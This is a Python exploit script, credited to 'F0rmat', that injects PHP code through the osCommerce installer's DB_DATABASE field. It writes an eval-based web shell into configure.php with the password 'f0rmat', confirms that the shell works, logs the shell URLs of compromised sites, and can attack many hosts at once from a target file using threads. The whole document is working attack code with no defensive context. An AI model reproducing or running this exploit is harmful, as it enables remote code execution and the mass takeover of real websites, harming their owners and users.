#!/usr/bin/env
#author:F0rmat
import sys
import requests
import threading
def exploit(target):
    if sys.argv[1]== "-f":
        target=target[0]
    url1=target+"/install/install.php?step=4"
    data={
    'DIR_FS_DOCUMENT_ROOT': './',
    'DB_DATABASE':"\');@eval($_POST['f0rmat']);echo 'F0rmat';/*"
    }
    url2=target+"install/includes/configure.php"
    try:
        requests.post(url1,data=data)
        verify = requests.get(url2, timeout=3)
        if "F0rmat" in verify.content:
            print 'Write success,shell url:',url2,'pass:f0rmat'
            with open("success.txt","a+") as f:
                f.write(url2+'  pass:f0rmat'+"\n")
        else:
            print target,'Write failure!'
    except Exception, e:
        print e
def main():
    if len(sys.argv)<3:
        print 'python osCommerce_rce.py -h target/-f target-file '
    else:
        if sys.argv[1] == "-h":
            exploit(sys.argv[2])
        elif sys.argv[1] == "-f":
            with open(sys.argv[2], "r") as f:
                b = f.readlines()
                for i in xrange(len(b)):
                    if not b[i] == "\n":
                        threading.Thread(target=exploit, args=(b[i].split(),)).start()



if __name__ == '__main__':
    main()
